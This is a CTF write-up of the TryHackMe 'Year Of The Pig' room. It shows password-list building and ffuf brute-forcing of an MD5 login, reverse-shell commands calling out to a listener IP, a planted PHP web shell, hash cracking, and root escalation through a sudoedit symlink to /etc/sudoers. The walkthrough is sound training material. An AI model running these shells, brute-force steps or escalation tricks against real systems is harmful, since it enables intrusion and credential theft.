---
title: THM - Year Of The Pig
date: 2025-12-4
categories: [THM_hard]
tags: [THM, sudoedit_PrivEsc PrivEsc, Cracking passwords, Password Attack]
author: 0x3bs
published: true
image: /assets/images/thm/year_of_the_pig/pig.jpeg  
---




---
---

> ## Recon

> ### nmap

First I started with `nmap` :

```bash
┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/thm/Year_of_the_Pig]
└─# cat nmap.txt
# Nmap 7.95 scan initiated Wed Dec  3 06:45:25 2025 as: /usr/lib/nmap/nmap -sV -sC -o nmap.txt 110.81.147.111
Nmap scan report for 10.81.147.111
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  3 06:48:22 2025 -- 1 IP address (1 host up) scanned in 177.18 seconds
```

Noticed that there is `22/tcp` port is open and `80/tcp` too .

> ### Website

Let's check for the website which is `marco` blog :

![](/assets/images/thm/year_of_the_pig/0.png)

It's seems like normal blog .....


> #### Discovering Web Directories

Let's discover any directories in the website  by `feroxbuster` :

```bash
┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/thm/Year_of_the_Pig]
└─# feroxbuster -u http://10.81.147.111
                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.82.171.39/
 🚩  In-Scope Url          │ 10.82.171.39
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      312c http://10.82.171.39/admin => http://10.82.171.39/admin/
301      GET        9l       28w      309c http://10.82.171.39/js => http://10.82.171.39/js/
200      GET       49l      200w     2515c http://10.82.171.39/css/saira.css
200      GET      520l     1472w   107165c http://10.82.171.39/assets/img/plane.png
301      GET        9l       28w      310c http://10.82.171.39/api => http://10.82.171.39/api/
200      GET       85l      448w   134057c http://10.82.171.39/assets/img/favicon.ico
200      GET    10139l    19192w   184832c http://10.82.171.39/css/styles.css
301      GET        9l       28w      313c http://10.82.171.39/assets => http://10.82.171.39/assets/
301      GET        9l       28w      310c http://10.82.171.39/css => http://10.82.171.39/css/
200      GET        1l       44w     2532c http://10.82.171.39/js/jquery.easing.min.js
200      GET       42l      121w     1423c http://10.82.171.39/js/scripts.js
200      GET       97l      328w     3831c http://10.82.171.39/css/muli.css
200      GET        1l        6w       68c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        7l     1029w    81084c http://10.82.171.39/js/bootstrap.bundle.min.js
200      GET        2l     1185w    89476c http://10.82.171.39/js/jquery.min.js
200      GET        5l    20594w  1172040c http://10.82.171.39/js/all.js
200      GET       72l      462w     4801c http://10.82.171.39/
301      GET        9l       28w      319c http://10.82.171.39/assets/fonts => http://10.82.171.39/assets/fonts/
301      GET        9l       28w      317c http://10.82.171.39/assets/img => http://10.82.171.39/assets/img/
[####################] - 7m    240031/240031  0s      found:18      errors:12106  
[####################] - 6m     30000/30000   77/s    http://10.82.171.39/ 
[####################] - 7m     30000/30000   75/s    http://10.82.171.39/admin/ 
[####################] - 6m     30000/30000   78/s    http://10.82.171.39/js/ 
[####################] - 7m     30000/30000   77/s    http://10.82.171.39/api/ 
[####################] - 7m     30000/30000   77/s    http://10.82.171.39/assets/ 
[####################] - 6m     30000/30000   79/s    http://10.82.171.39/css/ 
[####################] - 7m     30000/30000   76/s    http://10.82.171.39/assets/img/ 
[####################] - 6m     30000/30000   80/s    http://10.82.171.39/assets/fonts/ 
```

okay the most interesting directories is `.../admin/` And `.../api/`

let's check `.../admin/` :

![](/assets/images/thm/year_of_the_pig/1.png)

mmmmmmm it's redirect us to `.../login.php/` and after typing any this in these fields it's gave us a hint about password which is the password should be a memorable word (for marco) and followed y 2 numbers and 1 special char . 

Okay let's go back to the blog to find any hints >>

![](/assets/images/thm/year_of_the_pig\2.png)

this was the hint which is `Savoia S.12` .... So the password should be like that >>

```bash
┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/thm/Year_of_the_Pig]
└─# cat password.txt
SavoiaS21
Savoias21
savoias21
savoia21
```

-----

> ## Get The password

> ### list of properly Passwords

Let's make a bash script to add all special characters to each of them

```bash
!/bin/bash

special=("!" "@" "#" "$" "&" "%" "*")

for i in $(cat password.txt) ; do 
    for x in "${special[@]}" ; do
echo "${i}${x}" >> pass2.txt
    done
done

```

Result of the script :

```bash
┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/thm/Year_of_the_Pig]
└─# cat pass2.txt  
SavoiaS21!
SavoiaS21@
SavoiaS21#
SavoiaS21$
SavoiaS21&
SavoiaS21%
SavoiaS21*
Savoias21!
Savoias21@
Savoias21#
Savoias21$
Savoias21&
Savoias21%
Savoias21*
savoias21!
savoias21@
savoias21#
savoias21$
savoias21&
savoias21%
savoias21*
savoia21!
savoia21@
savoia21#
savoia21$
savoia21&
savoia21%
savoia21*
```

Okay but before brute force with this list we must know the password send in string or in hash , And what's the login creds redirect to . 
So let's check this by sending a test login creds >

Creds will be > `macro` : `test`

![](/assets/images/thm/year_of_the_pig/4.png)

let's show it using `burp suite` :

![](/assets/images/thm/year_of_the_pig/5.png)

So the password sent as `md5` hash in `.../api/login`

okay to brute force it we must change all passwords to `md5` hash :

> ### Brute Force And Get The Password

> #### Get the hashes

let's make a simple bash script to get the `md5` hash for all of the passwords :

To get any `md5` hash in bash >>

```bash
┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/thm/Year_of_the_Pig]
└─# echo -n "test" | md5sum  | awk '{print $1}'
098f6bcd4621d373cade4e832627b4f6
```


So the bash script will be :

```bash
#!/bin/bash
for i in $(cat pass2.txt) ; do
    echo -n $i | md5sum | awk '{print $1}' >> hashes.txt 
done
```


> #### Brute Force

Let's brute fore with `fuff` :


the syntax :
```bash
ffuf -w {hashes_list} -H "Accept: application/json" -X POST -d '{"username":"marco","password":"FUZZ"}' -u http://{Machine_IP}/api/login 
```

In my Case it will be :

```bash
┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/thm/Year_of_the_Pig]
└─# ffuf -w hashes.txt -H "Accept: application/json" -X POST -d '{"username":"marco","password":"FUZZ"}' -u http://10.81.147.111/api/login        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.81.147.111/api/login
 :: Wordlist         : FUZZ: /home/e_3bs/Desktop/thm/Year_of_the_Pig/hashes.txt
 :: Header           : Accept: application/json
 :: Data             : {"username":"marco","password":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

066b6d9facbfcbb840a5b1f17d833231 [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 121ms]
049b89397d6a475e8f2efd981b8739c9 [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 144ms]
2a6cb51fb588013433817f9fe0ffdb05 [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 286ms]
beb5201319aed85993cc5e4c89a757db [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 288ms]
5a13b6571680e7a25b006ced781ca765 [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 292ms]
fb86b482f8d3f770d1b1309670259663 [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 292ms]
5b420a6b365aa4a52f2906ff59fe8da7 [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 290ms]
e2c9e575157624f1f8f8c26aa7f1e4ba [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 294ms]
c484b5531b16b6ee1d8547919065d99d [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 294ms]
a35fb2cfda3e93e273284b67491dac54 [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 296ms]
1670417485cae5a970f514d926fa8d24 [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 296ms]
ea22b622ba9b3c41b22785dcb40211ac [Status: 200, Size: 99, Words: 3, Lines: 1, Duration: 545ms]
1d7aa28d00068808aa4ddcd348211dad [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 545ms]
059a38d3128c2f1e218deb4d4247215a [Status: 200, Size: 63, Words: 4, Lines: 1, Duration: 546ms]
ceaf4722a9c83988d2bdbafd05fb5409 [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 545ms]
3e41070d0143522898cb1e434c3fd28b [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 545ms]
78759e5f2b4e958a7291ae1e74511d05 [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 545ms]
874379f463b6b7a7f416b0cfa60036df [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 544ms]
da04979f2834c05d0c213a2b02f70bfa [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 545ms]
7876ce3b8292773d5fdd7a7973f74eaa [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 545ms]
eab299ca4072300bb648809f9e1e3f96 [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 546ms]
17ad6d490e63f5157a2e47e41a512d9a [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 546ms]
cc988263efb68de4b3e3e1300b804374 [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 545ms]
1d28626df357f67afbbb900ae861e47f [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 545ms]
16ca8fe93ba860a61adc17d396671c1a [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 545ms]
0537312b87e47de57fe3686aabdc25be [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 546ms]
c2238b80dfa7afa1164cde710b6fe3ff [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 546ms]
05f69f30776dc897b1b7adc60067284b [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 546ms]
:: Progress: [28/28] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

```bash
ea22b622ba9b3c41b22785dcb40211ac [Status: 200, Size: 99, Words: 3, Lines: 1, Duration: 545ms]
```

this is the different one BC it's size and it's status code is 200


> #### Crack Right Hash

Okay let's crack the correct hash by `hashcat` :

```bash
hashcat -m 0 -a 0 "ea22b622ba9b3c41b22785dcb40211ac" pass2.txt
```

![](/assets/images/thm/year_of_the_pig/7.png)

So the password will be : `savoia21!`

---

> ## Login With Creds 

> ### Login As Admin

After login to `../admin/` with the creds :

I found this part if the page >>

![](/assets/images/thm/year_of_the_pig/8.png)

I tried these commands >

```bash
whoami

id

bash -i >& /dev/tcp/192.168.175.141/9001 0>&1

nc -nv 192.168.175.141 9001 -e /bin/bash
```

the commands `whoami` & `id` succeeded  , `bash -i >& /dev/tcp/192.168.175.141/9001 0>&1`  give an error , `nc -nv 192.168.175.141 9001 -e /bin/bash`  didn't give an error but i received a connection but without a shell 🙃  


> ### SSH Login 

Okay let's try to login with `SSH` with the same creds >>

```bash
┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/thm/Year_of_the_Pig]
└─# ssh marco@10.81.147.111
marco@10.81.147.111's password: 


        __   __                       __   _   _            ____  _       
        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \(_) __ _ 
         \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_) | |/ _` |
          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  __/| | (_| |
          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|   |_|\__, |
                                                                    |___/ 


marco@year-of-the-pig:~$ 
```

Okay it succeeded 🤩

```bash
marco@year-of-the-pig:~$ ls
flag1.txt
```


---


> ## PrivEsc 

> ### Curtis 

It seems like i sould login as `curtis` to get the `flag2.txt` okay ...

I found a database `/var/www/admin.db` but `www-data` the only user who can read it .

And there is `php` file `/var/www/html/admin/command.php` 

![](/assets/images/thm/year_of_the_pig/6.png)

okay bc we can write in this file let's write  code which we can execute commands as `ww-data` :

```bash
marco@year-of-the-pig:/var/www/html/admin$ nano commands.php
marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
<?php
echo system($_REQUEST['command']);
?>
```

result

```bash
marco@year-of-the-pig:/var/www/html/admin$ curl http://localhost/admin/commands.php -d 'command=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(web-developers)
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(web-developers)marco@year-of-the-pig:/var/www/html/admin$ 
```

OK let's change the permission of `/var/www/admin.db` to be readable for any one >:

```bash
marco@year-of-the-pig:/var/www/html/admin$ curl http://localhost/admin/commands.php -d 'test=chmod 777 /var/www/admin.db'
marco@year-of-the-pig:/var/www/html/admin$ ls -lah /var/www | grep admin
-rwxrwxrwx  1 www-data www-data        24K Aug 21  2020 admin.db
marco@year-of-the-pig:/var/www/html/admin$ \
```

Okay now let's read the file with `sqlite3`

```bash
marco@year-of-the-pig:/var/www/html/admin$ sqlite3 /var/www/admin.db
SQLite version 3.22.0 2018-01-22 18:45:57
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> select * from users;
58a2f366b1fd51e127a47da03afc9995|marco|ea22b622ba9b3c41b22785dcb40211ac
f64ccfff6f64d57b121a85f9385cf256|curtis|a80bfe309ecaafcea1ea6cb3677971f2
sqlite> 
```

Okay let's crack `curtis` password hash >>

![](/assets/images/thm/year_of_the_pig/9.png)

so the password for user `curtis` : `Donald1983$` 

Okay let's login to get `flag2.txt` :

```bash
marco@year-of-the-pig:/var/www/html/admin$ su curtis
Password: 
curtis@year-of-the-pig:/var/www/html/admin$ ls /home/curtis
flag2.txt
curtis@year-of-the-pig:/var/www/html/admin$ 
```

> ### Root

Okay first let's run `sudo -l` : 

```bash
curtis@year-of-the-pig:/var/www/html/admin$ sudo -l
Matching Defaults entries for curtis on year-of-the-pig:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"

User curtis may run the following commands on year-of-the-pig:
    (ALL : ALL) sudoedit /var/www/html/*/*/config.php
curtis@year-of-the-pig:/var/www/html/admin$ 

```


[sudoedit exploit](https://www.exploit-db.com/exploits/37710)

Okay the idea is to make `/var/www/html/*/*/config.php` file which linked with `/etc/sudoers` bc when we run `sudoedit /var/www/html/*/*/config.php` we will edit `/etc/sudoers` to give us the root privilege .

> #### Make  Directories 

okay let's make any directory in `/var/www/html` :

```bash
curtis@year-of-the-pig:/var/www/html$ mkdir test
mkdir: cannot create directory ‘test’: Permission denied
```

we couldn't as `curtis` so let's try with `marco` and change the `test` dir permission :

```bash
curtis@year-of-the-pig:/var/www/html$ exit
exit
marco@year-of-the-pig:/var/www/html$ mkdir test
marco@year-of-the-pig:/var/www/html$ chmod 777 test
```

Okay let's make the second dirs :

```bash
marco@year-of-the-pig:/var/www/html$ su curtis
Password: 
curtis@year-of-the-pig:/var/www/html$ cd test
curtis@year-of-the-pig:/var/www/html/test$ mkdir test2
curtis@year-of-the-pig:/var/www/html/test$ cd test2
```


> #### Make The Linked File

Okay let's make the linked file (which is we can run `sudoedit` on it ) we will link it to `/etc/sudoers` :

```bash
curtis@year-of-the-pig:/var/www/html/test/test2$ ls -lah
total 8.0K
drwxrwxr-x 2 curtis curtis 4.0K Dec  4 20:15 .
drwxrwxrwx 3 marco  marco  4.0K Dec  4 20:14 ..
lrwxrwxrwx 1 curtis curtis   12 Dec  4 20:15 config.php -> /etc/sudoers

```


> #### Make `curtis` Root without Password

Okay now let's edit the `/ec/sudoers` by

```bash
sudoedit /var/www/html/test/test2/config.php
```

and write in it :

```txt
curtis ALL=(ALL) ALL
```

Let's try to login as root

```bash
curtis@year-of-the-pig:/var/www/html/test/test2$ sudo su
root@year-of-the-pig:/var/www/html/test/test2# 
```

We succeeded 🤩


```bash
root@year-of-the-pig:/var/www/html/test/test2# ls /root
root.txt
root@year-of-the-pig:/var/www/html/test/test2# 
```

